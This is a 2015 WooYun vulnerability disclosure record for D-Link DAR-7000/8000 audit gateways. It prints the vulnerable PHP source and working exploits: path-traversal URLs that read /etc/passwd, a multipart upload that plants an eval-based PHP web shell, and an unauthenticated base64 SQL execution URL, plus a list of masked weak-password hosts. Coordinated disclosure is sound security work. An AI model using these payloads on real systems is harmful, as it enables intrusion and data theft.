{"id": 71255, "wybug_id": "wooyun-2015-0135939", "wybug_title": "D-Link某系列上网行为审计网关存在任意文件遍历&amp;Getshell&amp;SQL命令执行", "wybug_corp": "友讯网络", "wybug_author": "YY-2012", "wybug_date": "2015-08-23 21:27", "wybug_open_date": "2015-11-23 19:12", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-23：\t细节向公众公开  简要描述： Y__Y 详细说明：  两处任意文件遍历(需登录)一处Getshell(需登录)一处SQL命令执行（无需登录）根据案例测试发现涉及“DAR-8000 系列上网行为审计网关”和“DAR-7000 系列上网行为审计网关”两款网关。   漏洞证明：  第一处任意文件遍历(文件download.php)：\n<?phpinclude_once('../session.php');include_once('../global.func.php');include_once('../include/language_cn.php');include_once('inc/mail.inc.php');include_once('../include/socket.php');$file=urldecode(base64_decode($_GET[\"file\"]));$ifother = \"\";if(!isset($_GET['local'])){  $ifother = ifExistOther($file);  if($ifother!=\"\")  {\t$file = $ifother;  }  else   {\terror();\t\texit();  }}$path_parts = pathinfo($file);if(isset($_GET['filetype'])){\tif($_GET['filetype']==\"SMTP\"&&$path_parts['extension'] == \"pcap\")\t{\t\t$returnvalue = parser_capmail($file,\"smtp\");\t\tif ($returnvalue != \"139\"&&$returnvalue != \"0\") {\t\t\terror();\t\t\texit();\t\t}\t\t$rpos = strrpos($file,\".\");\t\t$file = substr($file,0,$rpos).\".eml\";\t}\tif($_GET['filetype']==\"POP\"&&$path_parts['extension'] == \"cap\")\t{\t\t$returnvalue = parser_capmail($file);\t\tif ($returnvalue != \"139\"&&$returnvalue != \"0\") {\t\t\terror();\t\t\texit();\t\t}\t\t$rpos = strrpos($file,\".\");\t\t$file = substr($file,0,$rpos).\".eml\";\t\t$file=str_replace(\"pop\",\"pma\",$file);\t}}$get_type = $_GET['type'];if(!file_exists($file)){\t$url_from = $_GET['url'];\terror();\texit();}switch($get_type){\tcase 'chat':\t\t$lines = file($file);\t\tini_set(\"default_charset\",'utf-8');//!!!!!\t\t$html=\"<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8' /><link href='../css/zooe.css' type='text/css' rel='stylesheet'><title>Chat content</title></head><body><br><br>\";\t\t$html.=\"<div align=center><b>Chat Content</b></div>\";\t\t$html.=\"<table align='center' style='border:1px solid #CEE3FB;' width='80%' border='0'>\";\t\t\tforeach ($lines as $line_num => $line)\t\t{\t\t\t$line_test = $line;\t\t\tif($line_test != \"\"&&$line_test != null)\t\t\t{\t\t\t\t$line = $line_test;\t\t\t}\t\t\t//echo $line.\"<br>\";\t\t\t//$line = iconv(\"UTF-8\",\"GB2312//ignore\",$line);//GBK UTF-8 GB2312//ignore\t\t\t$html.=\"<tr>\";\t\t\t$html.=\"<td>\".$line.\"</td>\";\t\t\t$html.=\"</tr>\";\t\t\t/*if(preg_match_all(\"/^(.*?):(.*?)$/s\",$line,$re))\t\t\t{\t\t\t$html.=\"<tr>\";\t\t\t$html.=\"<td>\".$re[1][0].\"</td>\";\t\t\t$html.=\"<td>\".$re[2][0].\"</td>\";\t\t\t$html.=\"</tr>\";\t\t\t}*/\t\t}\t\t$html.=\"</table>\";\t\t$html.=\"<br><br><div align=center><input type='button' value='close' onclick='window.close()' class='btn'></div>\";\t\t$html.=\"</body></html>\";\t\techo $html;\t\tbreak;\tcase 'webqq':\t\t$lines = file($file);\t\t$html=\"<html><head><link href='../css/zooe.css' type='text/css' rel='stylesheet'><title>Chat content</title></head><body><br><br>\";\t\t$html.=\"<div align=center><b>WEBQQ Content</b></div>\";\t\t$html.=\"<table align='center' style='border:1px solid #CEE3FB;' width='80%' border='0'>\";\t\tforeach ($lines as $line_num => $line)\t\t{\t\t\t$line_test = $line;\t\t\tif($line_test != \"\"&&$line_test != null)\t\t\t{\t\t\t\t$line = urldecode($line_test);\t\t\t\t\t\t\t}\t\t\t//echo $line.\"<br>\";\t\t\tif(strstr($line,\"\\u\"))\t\t\t   $line = unicode_decode($line_test);\t\t\telse\t\t\t   $line = iconv(\"UTF-8\",\"GB2312//ignore\",$line);\t\t\t$html.=\"<tr>\";\t\t\t$html.=\"<td>\".$line.\"</td>\";\t\t\t$html.=\"</tr>\";\t\t\t\t\t}\t\t$html.=\"</table>\";\t\t$html.=\"<br><br><div align=center><input type='button' value='$LANG_CLOSE' onclick='window.close()' class='btn'></div>\";\t\t$html.=\"</body></html>\";\t\techo $html;\t\tbreak;\tcase 'content':\t\t$time_begin = $_GET['time_begin'];        $time_end = $_GET['time_end'];        $arr_tab_names = getTableByTimeRange(\"tb_PostLog\",urldecode($time_begin),urldecode($time_end));\t\t$id=$_GET['id'];\t\t$sql = \"\";        for($i=0;$i<$tab_count;$i++)        {\t          $tablename = $arr_tab_names[$i];\t         if(!TableExists($tablename,\"nsg\")) continue;\t        $sql.= \"select * from (\";            $sql.= \"select content from \".$arr_tab_names[$i].\" where id=$id\";            $sql.= \" ) as tmp$i \";\t        if(($tab_count-1) != $i) $sql.= \" union \";        }\t\t\t\t$result=byzoro_query_error($sql);\t\tif($result)\t\t{\t\t\t$num=byzoro_num_rows($result);\t\t\tif($num>0)\t\t\t{\t\t\t\t$rows=byzoro_fetch_array($result);\t\t\t\t$str=$rows['content'];\t\t\t\tif(isset($_GET['keyword']))\t\t\t\t{\t\t\t\t\t$keyword=$_GET['keyword'];\t\t\t\t\t$str=str_replace($keyword,\"<b style=\\\"color:black;background-color:#ffff66\\\">\".$keyword.\"</b>\",$str);\t\t\t\t}\t\t\t\techo htmlspecialchars($str);\t\t\t}\t\t}\t\tbreak;\tcase 'chat_qq':\t\t$lines = file($file);\t\t$html=\"<html><head><link href='../css/zooe.css' type='text/css' rel='stylesheet'><title>Chat content</title></head><body><br><br>\";\t\t$html.=\"<div align=center><b>QQ Content</b></div>\";\t\t$html.=\"<table align='center' style='border:1px solid #CEE3FB;' width='80%' border='0'>\";\t\t$html.=\"<tr height='35px'><td>&nbsp;</td><td>&nbsp;</td></tr>\";\t\tforeach ($lines as $line_num => $line)\t\t{\t\t\t$line_test = $line;\t\t\tif($line_test != \"\"&&$line_test != \"null\")\t\t\t{\t\t\t\t$line = $line_test;\t\t\t}\t\t\t//echo $line.\"<br>\";\t\t\t//$line = iconv(\"UTF-8\",\"GB2312\",$line);\t\t\t$html.=\"<tr>\";\t\t\t$html.=\"<td width='5%'>&nbsp;</td>\";\t\t\t$html.=\"<td>\".iconv(\"utf-8\",\"GB2312//ignore\",$line).\"</td>\";\t\t\t$html.=\"</tr>\";\t\t\t/*if(preg_match_all(\"/^(.*?):(.*?)$/s\",$line,$re))\t\t\t{\t\t\t$html.=\"<tr>\";\t\t\t$html.=\"<td>\".$re[1][0].\"</td>\";\t\t\t$html.=\"<td>\".$re[2][0].\"</td>\";\t\t\t$html.=\"</tr>\";\t\t\t}*/\t\t}\t\t$html.=\"<tr height='30px'><td>&nbsp;</td><td>&nbsp;</td></tr>\";\t\t$html.=\"</table>\";\t\t$html.=\"<br><br><div align=center><input type='button' value='$LANG_CLOSE' onclick='window.close()' class='btn'></div>\";\t\t$html.=\"</body></html>\";\t\techo $html;\t\tbreak;\tcase 'filedown':\t\tdownload($file,$_GET['filename']);\t    break;}function download($sFilePath,$file_name){\tif(file_exists($sFilePath))\t{\t\t$file_size=filesize ($sFilePath);\t\tHeader( \"Expires: 0\" );\t\tHeader( \"Pragma: public\" );\t\tHeader( \"Cache-Control: must-revalidate, post-check=0, pre-check=0\" );\t\tHeader( \"Cache-Control: public\");\t\tHeader( \"Content-Type: application/octet-stream\" );\t\theader(\"Accept-Ranges: bytes\");\t\theader(\"Accept-Length: $file_size\");\t\tif (strstr($_SERVER[\"HTTP_USER_AGENT\"],\"MSIE\"))\t\t{\t\t\tHeader( \"Content-Disposition: attachment; filename=\".$file_name );\t\t}\t\telse\t\t{\t\t\theader(\"Content-Disposition: attachment; filename=\".$file_name);\t\t}\t\t$fp = fopen($sFilePath,\"r\");\t\t$buffer_size = 1024;\t\t$cur_pos = 0;\t\twhile(!feof($fp)&&$file_size-$cur_pos>$buffer_size)\t\t{\t\t\t$buffer = fread($fp,$buffer_size);\t\t\techo $buffer;\t\t\t$cur_pos += $buffer_size;\t\t}\t\t$buffer = fread($fp,$file_size-$cur_pos);\t\techo $buffer;\t\tfclose($fp);\t\treturn true;\t}\telse\t{\t\t$url_from=$_GET['url'];\t\terror();\t}}function error(){\tglobal $LANG_CONTENT_NOTOPEN,$LANG_RETURN,$LANG_BTN_CLOSE;\t//echo \"$LANG_CONTENT_NOTOPEN<a href=\\\"#\\\" onclick=javascript:history.back(-1)>$LANG_RETURN</a>&nbsp;&nbsp;<a href=\\\"javascript:window.close();\\\">$LANG_BTN_CLOSE</a>\";\techo \"<script>alert('$LANG_CONTENT_NOTOPEN');history.back(-1);</script>\";}?>\n\n参数file控制不严导致。文件路径需BASE64编码，利用方式https://地址/log/download.php?type=filedown&file=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==&filename=1.txt\n\n\n第二处任意文件遍历（文件resmanage.php）：\n<?phpinclude_once(\"../session.php\");include_once('../funlist.php');include_once(\"../global.func.php\");if ($_SESSION['language'] != \"english\") {    require_once (\"../include/language_cn.php\");} else {    require_once (\"../include/language_en.php\");}//tftp -g **.**.**.** -r useratte/tpl/_resmanage.php /** * Goofy 2011-11-30 * getDir()去文件夹列表，getFile()去对应文件夹下面的文件列表,二者的区别在于判断有没有“.”后缀的文件，其他都一样 *///获取文件目录列表,该方法返回数组function getDir($dir) {    $dirArray[] = NULL;    if (false != ($handle = opendir($dir))) {        $i = 0;        while (false !== ($file = readdir($handle))) {            //去掉\"“.”、“..”以及带“.xxx”后缀的文件            if ($file != \".\" && $file != \"..\" && !strpos($file, \".\")) {                $dirArray[$i] = $file;                $i++;            }        }        //关闭句柄        closedir($handle);    }    return $dirArray;}//获取文件列表function getFile($dir) {    $fileArray[] = NULL;    if (false != ($handle = opendir($dir))) {        $i = 0;        while (false !== ($file = readdir($handle))) {            //去掉\"“.”、“..”以及带“.xxx”后缀的文件            if ($file != \".\" && $file != \"..\" && strpos($file, \".\")) {                //$fileArray[$i]=\"./imageroot/current/\".$file;                $fileArray[$i] = $dir . $file;                if ($i == 100) {                    break;                }                $i++;            }        }        //关闭句柄        closedir($handle);    }    return $fileArray;}//上传$targetdir = \"/home/portal/res/\";function upload($targetdir) {\t    $filetype = substr($_FILES[\"file\"][\"type\"], 0, 5);    if($filetype != 'image'){          alert_only(\"不是图像文件，不能上传\");//不是图像文件，不能上传        return false;    }        if(round($_FILES[\"file\"][\"size\"]/1024)>1024){        alert_only(\"图像大于1M，不能上传\");//图像大于1M，不能上传        return false;    }           if (is_uploaded_file($_FILES['file']['tmp_name'])) {        if ($_FILES[\"file\"][\"error\"] > 0) {            alert_only(\"错误消息： \" . $_FILES[\"file\"][\"error\"]);//错误消息        } else {            $move = move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $targetdir . $_FILES[\"file\"][\"name\"]);            $str = \"config portal \\n resource file \".$targetdir . $_FILES[\"file\"][\"name\"].\" \\n\";            socket($str);            alert_only('上传成功!');//上传成功        }    } else {        alert_only('上传失败!');//上传失败    }}if (isset($_FILES['file'])) {    upload($targetdir);}//内存加载的文件数组function get_memory_file_arr(){    $str=\"show running-config portal\\n\";    $aaa=socket($str);    preg_match_all(\"/resource file (.*?)\\n/\",$aaa,$matches);    return $matches[1];}$memfile = get_memory_file_arr();$fileArray = getFile($targetdir);function get_sever_arr(){     $str=\"show running-config portal\\n\";     $aaa=socket($str);     preg_match_all(\"/resource server (.*?)\\n/\",$aaa,$matches);     return $matches[1];}$severarr = get_sever_arr();//删除if(isset($_GET['dels'])){    $dels = $_GET['dels'];    $dels = explode(\"||\", $dels);    $descompelet = true;    $commend  =\"config portal \\n\" ;    foreach ($dels as $value){        if(!unlink($value)){            $descompelet = false;        }        $commend.=\"no resource file \".$value.\" \\n\";    }    socket($commend);    if($descompelet){        alert(\"$LANG_DEL_SUCESS!\", \"resmanage.php\");    }else{         alert_only(\"$LANG_DEL_FAILD\");    }    die();}//下载if(isset($_GET['load'])){    $load = $_GET['load'];    $load = explode(\"||\", $load);    $load = implode(\" \",$load);    $dirr = \"/tmp/\";    chdir($dirr);    $commend = \"tar czvf img.tar.gz \".$load;     if (exec($commend,$output, $return_val)){    \techo \"<script>location='\" . $dirr . \"img.tar.gz';</script>\";    }else {    \talert_only(\"$LANG_DOWNFAILE\");    }    die();}if(isset($_GET['regist'])){    $regist = $_GET['regist'];    $regist = explode(\"||\", $regist);    $str =\"config portal \\n\" ;    foreach ($regist as $v){        $str.=\"resource file \".$v.\" \\n\";    }    socket($str);    location(\"resmanage.php\");    die();}if(isset($_GET['saveserver'])){//保存服务器资源    $saveserver = $_GET['saveserver'];    $saveserver = explode(\"||\", $saveserver);//$severarr    $arr1 = array_diff($saveserver,$severarr);//需要添加的。    $arr2 = array_diff($severarr,$saveserver);//需要删除的。    $str =\"config portal \\n\" ;    foreach ($arr2 as $v){    \tif (trim($v)==\"\")     \t{    \t\tcontinue;    \t}        $str.=\"no resource server \".trim($v).\" \\n\";    }    foreach ($arr1 as $v){    \tif (trim($v)==\"\")     \t{    \t\tcontinue;    \t}        $str.=\"resource server \".trim($v).\" \\n\";    }    $str.=\"exit\\n\";    socket($str);    echo \"<script>window.location.reload()</script>\";    die();}if(isset($_GET['delssrc'])){//删除服务器资源    $delssrc = $_GET['delssrc'];    $str =\"config portal \\n no resource server \".$delssrc .\"\\nexit\\n\";    socket($str);    echo \"<script>window.location.reload()</script>\";    die();}if (isset($_GET['webpush']) && $_GET['webpush']==1) { \t$menustr = \"当前位置：WEB推送 >> 定制推送页面 >> 资源文件管理\"; } else  { \t$menustr = \"当前位置：用户认证 >> 定制WEB认证页面 >> 资源文件管理\"; }require_once(\"tpl/_resmanage.php\");\n\n参数load控制不严导致，利用方式https://地址/useratte/resmanage.php?load=../../../../etc/passwd\n\n以上访问会生成一个临时gz压缩文件tmp/img.tar.gz该文件无需登录可直接访问下载。\n\n\n\n\n一处Getshell（与上面文件一样，同样是文件resmanage.php）：\nPOST /useratte/resmanage.php? HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: **.**.**.**:8443/useratte/resmanage.php?webpush=1Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Content-Type: multipart/form-data; boundary=---------------------------7df257213045aAccept-Encoding: gzip, deflateHost: **.**.**.**:8443Content-Length: 1325Connection: Keep-AliveCache-Control: no-cacheCookie: PHPSESSID=bd04e3588f8e5c447f1b4f5a826ca979-----------------------------7df257213045aContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"Content-Type: image/pjpeg<?php @eval($_POST['pass']);?>-----------------------------7df257213045aContent-Disposition: form-data; name=\"type\"uploados-----------------------------7df257213045a--\n\n\n\n\n\n**.**.**.**:8443/home/portal/res/test.php   密码pass\n一处无需登录下可SQL命令执行（文件importexport.php）：\n<?php require_once(\"global.func.php\");require_once(\"include/language_cn.php\");$arr_tab = array();$arr_tab['部门'] = \"select id,department_name,department_desc,start_ip,end_ip from tb_department;\";$arr_tab['用户'] = \"select `id`,`group_id`,`user_name`,`user_ip`,`user_mac`,`desc`,`user_mobile`,`user_tel`,`user_email`,`type` as `user_type` from tb_user\";if(isset($_GET['type'])) $get_type = $_GET['type'];if(isset($_GET['tab'])) $get_tab = $_GET['tab'];if(isset($_GET['sql'])) $get_sql = $_GET['sql'];if($get_type == \"exportexcel\")\t//导出excel{\texportExcel(\"$get_tab\",$arr_tab[$get_tab]);}if($get_type == \"exportexcelbysql\")\t//导出excel bysql{\tif ($get_tab==\"exportweblog\") //导出web认证日志\t{\t\t$get_tab = $arr_export_cn[\"tb_WebAuthLog\"];\t\texportWeblog(\"$get_tab\",stripslashes(base64_decode($get_sql)));\t\texit();\t}\t$get_tab = $arr_export_cn[$get_tab];\texportExcel(\"$get_tab\",stripslashes(base64_decode($get_sql)));}if($get_type == \"exportexcelbystring\") //导出by string{\texportExcelByString($get_tab,$get_sql);}?>\nSQL语句执行前需BASE64编码。利用方式如下：\n\n\n\n这里执行“select * from tb_operationlog ”语句为例：\nhttps://地址/importexport.php?sql=c2VsZWN0ICogZnJvbSB0Yl9vcGVyYXRpb25sb2cg%3D%3D&tab=tb_operationlog&type=exportexcelbysql\n弱口令案例：\n**.**.**.**:8443/home.php      DAR-7000 系列上网行为审计网关**.**.**.**:8443/home.php        DAR-7000 系列上网行为审计网关**.**.**.**:8443/home.php       DAR-7000 系列上网行为审计网关**.**.**.**:8443/home.php      DAR-7000 系列上网行为审计网关**.**.**.**:8443/home.php       DAR-8000 系列上网行为审计网关**.**.**.**:8443/home.php     DAR-7000 系列上网行为审计网关**.**.**.**:8443/home.php      DAR-8000 系列上网行为审计网关**.**.**.**:8443/home.php      DAR-8000 系列上网行为审计网关\n   修复方案：  联系厂商   版权声明：转载请注明来源 YY-2012@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-08-25 19:11 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}